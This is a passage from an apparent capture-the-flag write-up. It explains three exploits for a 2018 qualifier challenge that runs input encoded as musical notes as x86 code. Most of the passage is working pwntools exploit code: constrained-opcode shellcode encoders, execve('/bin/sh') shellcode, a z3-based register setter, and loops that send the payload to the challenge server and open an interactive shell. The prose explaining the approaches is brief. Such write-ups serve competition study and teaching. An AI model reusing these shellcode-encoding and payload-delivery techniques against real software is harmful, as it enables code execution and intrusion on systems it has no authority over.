payload += "\x8f\x00\x2b\x00"
payload += "\x3b\x02\xd3\x54\x36\x5f"
payload += "\x24\x00\xaa\x00"
payload += "\x8f\x00\xf4\x05"
payload += "\x8f\x00\xaa\x00"
payload += "\xfa\x02\x8c\x3f\x36\x5f"
payload += "\xfa\x02\xfb\x3b\x36\x5f"
payload += "\x8f\x00\x55\x00"
payload += "\x24\x00\x55\x00"
payload += "\x8f\x00\x4e\x05"
payload += "\xfa\x02\x8c\x3f\x36\x5f"
payload += "\xfa\x02\x10\x50\x36\x5f"
payload += "\x8f\x00\xaa\x00"
payload += "\x24\x00\xa7\x02"
payload += "\x24\x00\xaa\x00"
payload += "\x8f\x00\xa7\x02"
payload += "\x8f\x00\x9b\x0a"
payload += "\x24\x00\xaa\x00"
payload += "\x24\x00\x54\x01"
payload += "\x8f\x00\x9b\x0a"
payload += "\x8f\x00\xa7\x02"
payload += "\x24\x00\x54\x01"
payload += "\x8f\x00\x54\x01"


#Writing 89, bf and 90

payload += "\xbf\x00\xf4\x05"
payload += "\x24\x00\xf4\x05"
payload += "\x24\x00\xe7\x0b"
payload += "\x24\x00\xce\x17"
payload += "\x8f\x00\x9b\x2f"
payload += "\x8f\x00\x41\x01"
payload += "\x24\x00\xf4\x05"
payload += "\x24\x00\xe7\x0b"
payload += "\x24\x00\xce\x17"
payload += "\x8f\x00\x41\x01"
payload += "\x8f\x00\xa7\x02"
payload += "\x8f\x00\x30\x00"
payload += "\x3b\x02\x8c\x3f\x36\x5f"
payload += "\x3b\x02\x70\x35\x36\x5f"
payload += "\x8f\x00\x4e\x05"
payload += "\x24\x00\xf4\x05"
payload += "\x8f\x00\x4e\x05"
payload += "\x3b\x02\x8c\x3f\x36\x5f"
payload += "\x3b\x02\x10\x50\x36\x5f"
payload += "\x24\x00\xe7\x0b"
payload += "\xd3\x54\x36\x5f" * 6
payload += "\x8f\x00\x4e\x05"
payload += "\x3b\x02\x70\x35\x36\x5f"
payload += "\x3b\x02\x10\x50\x36\x5f"
payload += "\x24\x00\xce\x17"
payload += "\xd3\x54\x36\x5f"
payload += "\x8f\x00\x4e\x05"


#Inc ESI

payload += "\xd3\x54\x36\x5f" * 41


#AND with ESI

payload += "\x3c\x0b"
payload += "\x54\x47\x36\x5f"


#Clearing 4 values pointed by ESI

payload += "\x8f\x00\x2b\x00"
payload += "\x24\x00\x2b\x00" #0
payload += "\x24\x00\xaa\x00" #2
payload += "\x8f\x00\xa7\x02"
payload += "\x8f\x00\x55\x00" #1
payload += "\x24\x00\x55\x00" #1
payload += "\x8f\x00\x4e\x05" #5
payload += "\x8f\x00\x54\x01" #3
payload += "\x24\x00\x54\x01" #3
payload += "\x8f\x00\x35\x15" 


#Inserting 89 bf 90 90

payload += "\x8f\x00\xf4\x05"
payload += "\x24\x00\x2b\x00"
payload += "\x8f\x00\xf4\x05"
payload += "\x8f\x00\xe7\x0b"
payload += "\x24\x00\x55\x00"
payload += "\x8f\x00\xe7\x0b"
payload += "\x8f\x00\xce\x17"
payload += "\x24\x00\xaa\x00"
payload += "\x24\x00\x54\x01"
payload += "\x8f\x00\xce\x17"


#Setting eax

payload += "\x8f\x00\x36\x5f"
payload += "\x3b\x02\x54\x47\x36\x5f"


#Setting edx

payload += "\x36\x5f\x36\x5f" * 41


#Padding
payload += "\x54\x47\x36\x5f" * 250


#Terminator

payload += "\x00\x00"


def solve_pow(s, n):
        with context.local(log_level='warning'):
                r = remote('our_1337_server', 13337)
                r.sendline(s + ' ' + str(n))
                res = r.recvline().strip()
                r.close()
        return res

def connect():
        r = remote('4e6b5b46.quals2018.oooverflow.io', 31337)
        r.recvuntil('Challenge: ')
        chall_s = r.recvline().strip()
        r.recvuntil('n: ')
        chall_n = int(r.recvline().strip())
        r.sendline(solve_pow(chall_s, chall_n))
        return r

while 1:
    try:
        #conn = connect()
        conn = remote("127.0.0.1", 4000)
        conn.recvuntil("How does a shell sound?")
        conn.send(payload)
        conn.interactive()
    except EOFError:
        conn.close()
```


#### Second Exploit

The second idea was to write the mask and `/bin/sh\0` in the `USER_INPUT` after `\xff\xff`. We would set `al` to the desired byte through xoring it with bytes on the stack via `edi` and xor al back into our nop sled pointed by `esi`.
This way we craft a shellcode in our nop sled.  

```python
from pwn import *

shellcode = ""
shellcode += asm("nop")
shellcode += asm("nop")
shellcode += asm("nop")
shellcode += asm("nop")
shellcode += asm("xor eax, eax")
shellcode += asm("mov al, 0xb")
shellcode += asm("mov ebx, 0x40404e7c")
shellcode += asm("xor ecx, ecx")
shellcode += asm("xor edx, edx")
shellcode += asm("int 0x80")

# host = "127.0.0.1"
# port = 4000
host = '4e6b5b46.quals2018.oooverflow.io'
port = 31337

MASK = 0x60606ff0
NOP = "F3F3" #: ["inc esi", "xor eax, dword ptr [esi + 0x33]"]

n_to_f = {'G#1': 101, 'G#0': 51, 'G#3': 404, 'G#2': 202, 'G#5': 1614, 'G#4': 807, 'G#7': 6456, 'G#6': 3228, 'G#9': 25823, 'G#8': 12912, 'G7': 6094, 'G6': 3047, 'G5': 1524, 'G4': 762, 'G3': 381, 'G2': 191, 'G1': 96, 'G0': 48, 'G9': 24374, 'G8': 12187, 'D#8': 9673, 'D#9': 19346, 'D#6': 2419, 'A8': 6840, 'B4': 480, 'B5': 960, 'B6': 1920, 'B7': 3839, 'B0': 30, 'B1': 60, 'B2': 120, 'B3': 240, 'B8': 7678, 'B9': 15355, 'F#0': 45, 'F#1': 90, 'F#2': 180, 'F#3': 360, 'F#4': 719, 'F#5': 1438, 'F#6': 2876, 'F#7': 5752, 'F#8': 11503, 'F#9': 23006, 'E9': 20496, 'E8': 10248, 'E5': 1281, 'E4': 641, 'E7': 5124, 'E6': 2562, 'E1': 81, 'E0': 41, 'E3': 321, 'E2': 161, 'A#3': 227, 'A#2': 114, 'A#1': 57, 'A#0': 29, 'A#7': 3624, 'A#6': 1812, 'A#5': 906, 'A#4': 453, 'A#9': 14493, 'A#8': 7247, 'C9': 16268, 'C8': 8134, 'C3': 255, 'C2': 128, 'C1': 64, 'C0': 32, 'C7': 4067, 'C6': 2034, 'C5': 1017, 'C4': 509, 'F0': 43, 'F1': 85, 'F2': 170, 'F3': 340, 'F4': 679, 'F5': 1358, 'F6': 2715, 'F7': 5429, 'F8': 10858, 'F9': 21715, 'A1': 54, 'A0': 27, 'A3': 214, 'A2': 107, 'A5': 855, 'A4': 428, 'A7': 3420, 'A6': 1710, 'A9': 13680, 'D#7': 4837, 'D#4': 605, 'D#5': 1210, 'D#2': 152, 'D#3': 303, 'D#0': 38, 'D#1': 76, 'C#9': 17235, 'C#8': 8618, 'C#5': 1078, 'C#4': 539, 'C#7': 4309, 'C#6': 2155, 'C#1': 68, 'C#0': 34, 'C#3': 270, 'C#2': 135, 'D8': 9130, 'D9': 18260, 'D6': 2283, 'D7': 4565, 'D4': 571, 'D5': 1142, 'D2': 143, 'D3': 286, 'D0': 36, 'D1': 72}

def encoder(note):
    r = ""
    i = 0
    while i < len(note):
        if i+2 <= len(note) and note[i:i+2] in n_to_f:
            r += p16(n_to_f[note[i:i+2]])
            i += 2
        elif i+3 <= len(note) and note[i:i+3] in n_to_f:
            r += p16(n_to_f[note[i:i+3]])
            i += 3
        else: raise RuntimeError("fuuuuuuuuuuuuuuuck "+str(i))
    return r



def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

payload = ""

# set eax to 0x40404e78 -> 0x60607bf7
payload += encoder("".join(['G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'D5', 'D2', 'C7', 'D5', 'D4', 'C3', 'D5', 'D4', 'F6', 'D5', 'B0', 'B4', 'D5', 'A4', 'A4', 'D5', 'E0', 'D1', 'B3', 'G3', 'B3', 'G7']))
# B6C#0" : ["inc edx", "inc ebx", "n esi, dword ptr [eax]"] < questo per l'and con la maschera
payload += encoder("B6A#0")

# esi alignement
# F8F0 : ["inc esi", "cmp byte ptr [esi + 0x30], al"]
payload += encoder("F8F0")*3

#### COPYING THE SHELLCODE INTO THE NOP SLED

# Set al 0xa3
payload += encoder("".join(['B3', 'G5', 'B3', 'G8', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xd6
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

#Set al 0xa3
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0xd6
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0x2
payload += encoder("".join(['D5', 'G6', 'E4', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0x86
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D1', 'D5', 'E0', 'D9', 'D5', 'B4', 'G5', 'B3', 'G6', 'B3', 'G7', 'B3', 'G8', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x83
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0x4d
payload += encoder("".join(['B3', 'G1', 'B3', 'G6', 'B3', 'G7', 'B3', 'G8', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x88
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D1', 'D5', 'B4', 'G5', 'B3', 'G3', 'B3', 'G7', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x3a
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G3', 'B3', 'G8', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x7d
payload += encoder("".join(['D5', 'G6', 'E4']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x06
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G0', 'B3', 'G4', 'B3', 'G6', 'B3', 'G7', 'B3', 'G9']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x73
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x77
payload += encoder("".join(['B3', 'G5', 'B3', 'G6', 'B3', 'G8', 'B3', 'G9']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xfa
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G6', 'B3', 'G7', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x77
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G6', 'B3', 'G7', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xe1
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x8b
payload += encoder("".join(['D5', 'G6', 'E4', 'B3', 'G5']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xb3
payload += encoder("".join(['D5', 'B4', 'G5', 'B3', 'G5', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


print len(payload)

payload += encoder(NOP)*(2260/4 - 1)

payload += "\xff\xff"

payload += p32(MASK)

payload += "/bin/sh"

payload += p64(0x0)

print "PAYLOAD LEN:", len(payload)

def solve_pow(s, n):
        with context.local(log_level='warning'):
                r = remote('our_1337_server', 13337)
                r.sendline(s + ' ' + str(n))
                res = r.recvline().strip()
                r.close()
        return res

def connect():
        r = remote('4e6b5b46.quals2018.oooverflow.io', 31337)
        r.recvuntil('Challenge: ')
        chall_s = r.recvline().strip()
        r.recvuntil('n: ')
        chall_n = int(r.recvline().strip())
        print 'solving pow %s %d' % (chall_s, chall_n)
        r.sendline(solve_pow(chall_s, chall_n))
        return r

i = 0
done = False
while not done:
    try:
        conn = connect()
        #conn = remote("127.0.0.1", 4000)
        conn.recvuntil("sound?")
        conn.send(payload)
        conn.interactive()
    except:
        conn.close()
        pass
```


### Third Exploit

The third idea requires to carefully craft a copy primitive via `xor` instructions, and use the available instructions considering whether you have both a read and write gadget where needed, turns out we need to employ `edi` as "source" register and `esi` as a "destination" register. We can set the masks accordingly by  using just two gadgets. The shellcode in the `USER_INPUT` section will get copied via the xor instructions.
If we spray enough (that's why we choose a 3 byte NOP (e.g. G#0) we can craft the masks requiring us only 5 bits, making the exploit feasible.

```python
#from romanpwn import *
from pwn import *
from capstone import *
from z3 import *
import struct
import itertools

val_static = [0, 927150662, 927150660, 0, 927150658, 860042308, 944191811, 910570564, 893728833, 876752962, 0, 876688449, 1110451014, 876951111, 826552389, 960770117, 893858882, 0]

# 1178149703
# 1178149700
# 1177690945
# 1110451014
# 591870278 fanno casini (aaa)

vals = val_static + [
0x4f4f4f4f, # esp + 0x38
0x2d2d2d2d, # esp + 0x40
0x57202d2d, # esp + 0x42
0x6c655720, # esp + 0x44
0x636c6557, # esp + 0x45
0x6f636c65, # esp + 0x46
0x656d6f63, # esp + 0x48
0x20656d6f, # esp + 0x49
0x7420656d] # esp + 0x4a

offsets = {
    0x4f4f4f4f: 0,
    0x2d2d2d2d: 0x8,
    0x57202d2d: 0xa,
    0x6c655720: 0xc,
    0x636c6557: 0xd,
    0x6f636c65: 0xe,
    0x656d6f63: 0x10,
    0x20656d6f: 0x11,
    0x7420656d: 0x12
}

def set_eax(eax_val, tolerance=0xfff):
    # NB assumes edi was not changed!
    solver = Solver()
    l = []
    exp = None
    for i in range(len(vals)):
        temp = BitVec('b'+str(i), 32)
        l.append(temp)
        solver.add(Or(temp == 0, temp == 0xffffffff))
        if exp is not None:
            exp = exp ^ (vals[i] & temp)
        else:
            exp = (vals[i] * temp)

    solver.add(exp >= eax_val)
    solver.add(exp <= eax_val + tolerance)
    if solver.check() == unsat:
        print 'UNSAT'
    m = solver.model()

    res = 0
    for i in range(len(vals)):
        if not m[l[i]] == 0:
            # print(hex(vals[i]))
            res ^= vals[i]
    print "Address found:", hex(res)
    #assert res == eax_val 

    shellcode = []
    for i in range(18):
        if not m[l[i]] == 0:
            # NB increases esp
            temp = struct.pack('<L', vals[i])
            shellcode += ['D5', temp[:2], temp[2:]]

    incs = 0
    for i in range(18, 27):
        if not m[l[i]] == 0:
            while incs < offsets[vals[i]]:
                shellcode += ['G8', 'G0']  # inc edi
                incs += 1
            shellcode += ['B3', 'G8']

    return shellcode

#print set_eax(0x40404a4b)

def set_al(al_val, prev_value=0, position=0):
    bytelist = [178, 201, 245, 108, 132, 152, 174, 200, 223, 234, 252, 10, 21, 205, 226, 243, 56, 67, 121, 207, 238, 2, 18, 59, 156, 234, 102, 134, 149, 162, 182, 152, 191, 222, 246, 5, 22, 63, 94, 131, 139, 156, 209, 231, 26, 163, 202, 73, 111, 146, 163, 217, 235, 103, 130, 192, 222, 243, 16, 59, 68, 89, 108, 131, 158, 197, 14, 41, 61, 194, 227, 0, 32, 64, 33, 0, 16, 255]

    big_vals = {
        0x46: 0x37433246,
        0x44: 0x37433244,
        0x42: 0x37433242,
        0x43: 0x38473943,
        0x41: 0x35453841,
        0x47: 0x34453647,
        0x45: 0x31443045,
    }

    dvals = {65: ['D5', 'A8', 'E5'],
         66: ['D5', 'B2', 'C7'],
         67: ['D5', 'C9', 'G8'],
         68: ['D5', 'D2', 'C7'],
         69: ['D5', 'E0', 'D1'],
         70: ['D5', 'F2', 'C7'],
         71: ['D5', 'G6', 'E4'],     
        #0x40: ['B6', 'B2', 'E1'], # 0x31
        #0xe5: ['B6','B2', 'E2'],  # 0x32
        #0xf7: ['B6','B2', 'E3'],  # 0x33
        #0xff: ['B6','B2', 'E4'],  # 0x34
       # 0x69: ['B6','B2','E9']    # 0x39
    }
    vals = [x for x in dvals]

    ebpgadgets = [['G2', 'E' + str(i)] for i in (0, 4, 8)]
    incebp = ['E5', 'E4', 'C6', 'E5', 'E4', 'C6']

    steps = 0
    shellcode = []
    if position == 0:
        for _ in range(144 / 2):
            shellcode += incebp
        position = 144

    while position < (len(bytelist) * 4) + 144:
        available_bits = bytelist[(position-144)/4:(position-144)/4+3]
        #print(available_bits)
        tempvals = vals + available_bits
        #print(tempvals)
        solver = Solver()
        l = []
        exp = None
        for i in range(len(tempvals)):
            temp = BitVec('b'+str(i), 8)
            l.append(temp)
            solver.add(Or(temp == 0, temp == 0xff))
            if exp is not None:
                exp = exp ^ (tempvals[i] & temp)
            else:
                exp = (tempvals[i] & temp)

        solver.add(exp == (al_val ^ prev_value))
        solver.check()

        try:
            m = solver.model()

            for i in range(len(vals)):
                if not m[l[i]] == 0:
                    print('cons', hex(vals[i]))
                    # NB increases esp
                    shellcode += dvals[vals[i]]
            for i in range(len(tempvals) - len(vals)):
                if not m[l[len(vals) + i]] == 0:
                    print('mem', hex(available_bits[i]))
                    shellcode += ebpgadgets[i]

            print(steps)
            return shellcode, position

        except:
            #print("unsat")
            shellcode += incebp * 2
            position += 4
            steps += 1


    raise Exception("not solvable!")


binshaddr = 0x40404a4f

shellcode = asm(shellcraft.execve('/bin/ls', [''], []))

NOP = 'B7'    #inc edx; aaa ;
DNOP = 'G#7'    #inc edi; and esi, dword ptr [edi]; 

n_to_f = {'G#1': 101, 'G#0': 51, 'G#3': 404, 'G#2': 202, 'G#5': 1614, 'G#4': 807, 'G#7': 6456, 'G#6': 3228, 'G#9': 25823, 'G#8': 12912, 'G7': 6094, 'G6': 3047, 'G5': 1524, 'G4': 762, 'G3': 381, 'G2': 191, 'G1': 96, 'G0': 48, 'G9': 24374, 'G8': 12187, 'D#8': 9673, 'D#9': 19346, 'D#6': 2419, 'A8': 6840, 'B4': 480, 'B5': 960, 'B6': 1920, 'B7': 3839, 'B0': 30, 'B1': 60, 'B2': 120, 'B3': 240, 'B8': 7678, 'B9': 15355, 'F#0': 45, 'F#1': 90, 'F#2': 180, 'F#3': 360, 'F#4': 719, 'F#5': 1438, 'F#6': 2876, 'F#7': 5752, 'F#8': 11503, 'F#9': 23006, 'E9': 20496, 'E8': 10248, 'E5': 1281, 'E4': 641, 'E7': 5124, 'E6': 2562, 'E1': 81, 'E0': 41, 'E3': 321, 'E2': 161, 'A#3': 227, 'A#2': 114, 'A#1': 57, 'A#0': 29, 'A#7': 3624, 'A#6': 1812, 'A#5': 906, 'A#4': 453, 'A#9': 14493, 'A#8': 7247, 'C9': 16268, 'C8': 8134, 'C3': 255, 'C2': 128, 'C1': 64, 'C0': 32, 'C7': 4067, 'C6': 2034, 'C5': 1017, 'C4': 509, 'F0': 43, 'F1': 85, 'F2': 170, 'F3': 340, 'F4': 679, 'F5': 1358, 'F6': 2715, 'F7': 5429, 'F8': 10858, 'F9': 21715, 'A1': 54, 'A0': 27, 'A3': 214, 'A2': 107, 'A5': 855, 'A4': 428, 'A7': 3420, 'A6': 1710, 'A9': 13680, 'D#7': 4837, 'D#4': 605, 'D#5': 1210, 'D#2': 152, 'D#3': 303, 'D#0': 38, 'D#1': 76, 'C#9': 17235, 'C#8': 8618, 'C#5': 1078, 'C#4': 539, 'C#7': 4309, 'C#6': 2155, 'C#1': 68, 'C#0': 34, 'C#3': 270, 'C#2': 135, 'D8': 9130, 'D9': 18260, 'D6': 2283, 'D7': 4565, 'D4': 571, 'D5': 1142, 'D2': 143, 'D3': 286, 'D0': 36, 'D1': 72}

def encoder(note):
    r = ""
    i = 0
    while i < len(note):
        #print note[i:i+2]
        if i+2 <= len(note) and note[i:i+2] in n_to_f:
            r += p16(n_to_f[note[i:i+2]])
            i += 2
        elif i+3 <= len(note) and note[i:i+3] in n_to_f:
            r += p16(n_to_f[note[i:i+3]])
            i += 3
        else: raise RuntimeError(str(i))
    return r

MASK1 = 0x40404800
MASK2 = 0x60606800

payload = ""

SETEAX = set_eax(0x40404a4b, 0x0)
md = Cs(CS_ARCH_X86, CS_MODE_32)
baseaddr = 0x60606000

def disasm(code, address):
    instructions = ''
    regex = r'ptr \[e[bcd]x'
    size = 0
    for i in md.disasm(code, address):
        size += i.size
        instructions += '%s %s; ' % (i.mnemonic, i.op_str)
        if re.findall(regex, i.op_str):
            return None

    if size != len(code):
        return None

    return instructions


# SET_EAX = ['D5', 'G6', 'E4', 'D5', 'E0', 'D1', 'B3', 'G8', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'B3', 'G8', 'G8', 'G0', 'G8', 'G0', 'B3', 'G8']
#set eax to 0x40404a4b (== &mask1)
payload += encoder("".join(SETEAX))


payload += encoder('C#8')   #inc ebx; and edi, dword ptr [eax]; eax must point to mask1 0x4040404xxx
payload += encoder('C#7')   #inc ebx; and esi, dword ptr [edi];

# copy primitive assume we're writing to space memset to \x00

COPY = ""
# store the current value of al so we can xor back
COPY += encoder('B0F1')     #inc edx; xor byte ptr [esi + 0x31], al;
COPY += encoder('B2F4')     #inc edx; xor al, byte ptr [esi + 0x34];  next note-nop after three bytes use it to xor happily
# NOP is 2 bytes, we can use this to xor out stuff
COPY += encoder('G2G8')     #inc edi; xor al, byte ptr [edi + 0x38];
COPY += encoder('B0F1')     #inc edx; xor byte ptr [esi + 0x31], al;
COPY += encoder('F7')       #inc esi; aaa;

"""
write must be aligned to "NOTE-NOP" opcodes, we can use a different version of this 
depending on "nop" alignment :)
COPY += encoder('B0F0')     #inc edx; xor byte ptr [esi + 0x30], al;
COPY += encoder('B2F2')     #inc edx; xor al, byte ptr [esi + 0x32];
# NOP is 2 bytes, we can use this to xor out stuff
COPY += encoder('G2G8')     #inc edi; xor al, byte ptr [edi + 0x38];
COPY += encoder('B0F0')     #inc edx; xor byte ptr [esi + 0x30], al;
COPY += encoder('F7')       #inc esi; aaa;
"""

for _ in xrange(len(shellcode)):
    payload += COPY

mask_delta = (0x800 - len(payload) - 2)
n_nops = (mask_delta / 2 )             # a single note is encoded in a word
NOPS = encoder(DNOP) * n_nops
payload += NOPS

payload += "\xff\xff"
# payload += encoder('G3G2')           #inc edi; xor eax, dword ptr [edi + 0x30];

print hex(len(payload))
# mask to let us use \x00 (add    BYTE PTR [eax],al) as nop
payload += 'a' * (0x800 - len(payload))
assert len(payload) == 0x800
payload += p32(MASK2)
payload += 'b' * (0x838 - len(payload))
payload += 'c' + shellcode
payload += 'd' * (0xa4b - len(payload))
payload += p32(MASK1)

payload += '\x00\x00'

#print SETEAX
#print '\n'.join(disasm(''.join(SETEAX), baseaddr).split(';'))

with open('payload','w') as f:
    f.write(payload)

"""
p = process('./nop')
p.sendline(payload)
p.readline()
p.readline()
if r:
    print 'WOOOOOOOOOO %s' % r
"""
```


### Epilogue

We developed the three exploits in parallel.
